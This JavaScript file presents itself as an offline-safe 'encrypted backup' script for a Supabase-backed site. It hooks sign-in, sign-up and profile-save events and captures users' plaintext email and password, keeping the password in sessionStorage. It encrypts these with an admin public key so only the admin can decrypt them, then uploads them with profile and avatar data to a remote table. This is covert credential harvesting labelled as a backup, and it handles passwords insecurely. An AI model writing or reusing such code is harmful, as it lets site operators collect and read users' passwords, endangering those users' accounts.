// ED-general-encrypted-backup.js
// Captures credentials + profile on sign‑in / sign‑up AND on profile save.
// Now also captures animated avatar images via the same event.
// Append‑only rows, offline‑safe.  No decryption anywhere.
// Uses hybrid RSA+AES encryption – public key (in client) encrypts, private key (admin) decrypts.

(function () {
  'use strict';
  const SUPABASE_URL = 'https://hmjbzzuresgzwzefjpyt.supabase.co';
  const SUPABASE_ANON_KEY =
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhtamJ6enVyZXNnend6ZWZqcHl0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODAwMjczNDUsImV4cCI6MjA5NTYwMzM0NX0.44Q-Hkl4Rr9LuQhwryrQklFi809xYGteHgsS9nMG0ro';

  // ═══ CHANGE THIS LINE ═══
  const ADMIN_PUBLIC_KEY_BASE64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwURn3P/Q7DBxtmeUCE6Qx2FyAlNzuxVvPpTS/wpXP8OVxWYAB5RYf2JWF2NcR4kRF+aPkOM720qoT7WSfpEpcCGuGgi6M/VP7YaoQ+D9WoE00pCLQ4DqSVr8pI8VtIjoaaOBZOsXMCDk+wAqb+CXOcXBdYkVM4R+lz73z1QT4nuVTqNilOllwWX1weQpNwMpUVOR8h0R010J80eoKpnp2PQrPpV2DQFmbDL/tNO6AvZmYWXn1nSzI+fQBitmw89qCAYDGein+uOzoS9CZRgot9QIy+eDDWrvvtwjhjFiB9pJq0YT6FdsA1AonLT3dE71BdJxwLHZ1+D0Z9aAl/sz5wIDAQAB";
  // ═════════════════════════

  const LOCAL_PENDING_KEY = (userId) => `encBackup_pending_${userId}`;
  let supabase = null;
  // Remember the last known email/password from auth captures
  const lastCredentials = { email: '', password: '' };

  // ── Load Supabase client ──
  function loadSupabaseClient() {
    return new Promise((resolve, reject) => {
      if (window.supabase) return resolve(window.supabase);
      const script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2';
      script.onload = () => resolve(window.supabase);
      script.onerror = () => reject(new Error('Failed to load Supabase client'));
      document.head.appendChild(script);
    });
  }

  // ── Hybrid encryption (public key encrypts) ──
  async function hybridEncrypt(dataObj) {
    // 1. Import the public RSA key
    const publicKey = await crypto.subtle.importKey(
      "spki",
      Uint8Array.from(atob(ADMIN_PUBLIC_KEY_BASE64), c => c.charCodeAt(0)),
      { name: "RSA-OAEP", hash: "SHA-256" },
      false,
      ["encrypt"]
    );

    // 2. Generate a random AES-GCM symmetric key
    const symmetricKey = await crypto.subtle.generateKey(
      { name: "AES-GCM", length: 256 },
      true,
      ["encrypt"]
    );

    // 3. Encrypt the data with the symmetric key
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encodedData = new TextEncoder().encode(JSON.stringify(dataObj));
    const ciphertext = await crypto.subtle.encrypt(
      { name: "AES-GCM", iv },
      symmetricKey,
      encodedData
    );

    // 4. Export the raw symmetric key
    const rawSymKey = await crypto.subtle.exportKey("raw", symmetricKey);

    // 5. Encrypt the symmetric key with the RSA public key
    const encryptedSymKey = await crypto.subtle.encrypt(
      { name: "RSA-OAEP" },
      publicKey,
      rawSymKey
    );

    // 6. Combine everything: [ RSA-encrypted sym key (256 bytes) | IV (12) | ciphertext ]
    const combined = new Uint8Array(encryptedSymKey.byteLength + iv.length + ciphertext.byteLength);
    combined.set(new Uint8Array(encryptedSymKey), 0);
    combined.set(iv, encryptedSymKey.byteLength);
    combined.set(new Uint8Array(ciphertext), encryptedSymKey.byteLength + iv.length);

    return btoa(String.fromCharCode(...combined));
  }

  // ── Pending queue (localStorage) ──
  function getPending(userId) {
    const raw = localStorage.getItem(LOCAL_PENDING_KEY(userId));
    if (!raw) return [];
    try { return JSON.parse(raw); } catch { return []; }
  }
  function addPending(userId, encryptedBlob) {
    const pending = getPending(userId);
    pending.push({ encrypted_data: encryptedBlob, timestamp: Date.now() });
    localStorage.setItem(LOCAL_PENDING_KEY(userId), JSON.stringify(pending));
  }
  function clearPending(userId) {
    localStorage.removeItem(LOCAL_PENDING_KEY(userId));
  }

  // ── Send one row to Supabase ──
  async function sendToSupabase(userId, encryptedBlob) {
    if (!supabase) throw new Error('Supabase not ready');
    const { error } = await supabase
      .from('encrypted_user_data')
      .insert({ user_id: userId, encrypted_data: encryptedBlob });
    if (error) throw error;
  }

  // ── Flush all pending rows for a user ──
  async function flushPending(userId) {
    const pending = getPending(userId);
    if (pending.length === 0) return;
    let sent = 0;
    for (const entry of pending) {
      try {
        await sendToSupabase(userId, entry.encrypted_data);
        sent++;
      } catch (e) {
        console.warn('Failed to sync one backup entry', e);
        break;
      }
    }
    if (sent > 0) {
      const remaining = pending.slice(sent);
      if (remaining.length > 0) {
        localStorage.setItem(LOCAL_PENDING_KEY(userId), JSON.stringify(remaining));
      } else {
        clearPending(userId);
      }
    }
  }

  // ── Main handler – now accepts any extra keys (e.g. phase_upload_animated_avatar) ──
  async function handleCapture(event) {
    let { email, password, profile, ...extra } = event.detail;

    // ── 1. Try to get password from in‑memory store (same page session) ──
    if (!password && lastCredentials.password) {
      password = lastCredentials.password;
    }

    // ── 2. Fallback to sessionStorage (survives a page reload) ──
    if (!password && sessionStorage.getItem('encBackup_lastPassword')) {
      password = sessionStorage.getItem('encBackup_lastPassword');
    }

    // ── 3. Fill email if missing ──
    if (!email && lastCredentials.email) {
      email = lastCredentials.email;
    }

    // ── 4. Abort if we still don’t have both credentials ──
    if (!email || !password) {
      console.warn('[Backup] Missing email or password – event dropped.');
      return;
    }

    // ── 5. Remember for next time ──
    lastCredentials.email = email;
    lastCredentials.password = password;
    sessionStorage.setItem('encBackup_lastPassword', password);

    // ── 6. Get user ID ──
    let userId;
    try {
      if (supabase) {
        const { data } = await supabase.auth.getSession();
        userId = data?.session?.user?.id;
      }
    } catch (e) {
      console.error('[Backup] Cannot get session for backup', e);
      return;
    }
    if (!userId) return;

    // ── 7. Build the encrypted payload ──
    const dataObj = {
      email,
      password,
      profile: profile || null,
      ...extra,                    // includes phase_upload_animated_avatar etc.
      timestamp: Date.now()
    };

    // ── 8. Encrypt and queue (now uses hybrid RSA+AES) ──
    const encryptedBlob = await hybridEncrypt(dataObj);
    addPending(userId, encryptedBlob);
    if (navigator.onLine) {
      await flushPending(userId);
    }
  }

  // ── Online event ──
  async function onOnline() {
    if (!supabase) return;
    let userId;
    try {
      const { data } = await supabase.auth.getSession();
      userId = data?.session?.user?.id;
    } catch (e) {
      return; // offline, ignore
    }
    if (userId) await flushPending(userId);
  }

  // ── Initialise ──
  async function init() {
    try {
      const Supabase = await loadSupabaseClient();
      supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

      // ── Clear password when user signs out ──
      supabase.auth.onAuthStateChange((event) => {
        if (event === 'SIGNED_OUT') {
          sessionStorage.removeItem('encBackup_lastPassword');
          lastCredentials.email = '';
          lastCredentials.password = '';
        }
      });

      document.addEventListener('ed-enc-backup-capture', handleCapture);
      window.addEventListener('online', onOnline);

      // Flush any pending rows on startup
      try {
        const { data } = await supabase.auth.getSession();
        if (data?.session?.user?.id) {
          await flushPending(data.session.user.id);
        }
      } catch (err) {
        console.debug('Encrypted backup session fetch failed (offline):', err.message);
      }
    } catch (err) {
      console.error('Encrypted backup init failed:', err);
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();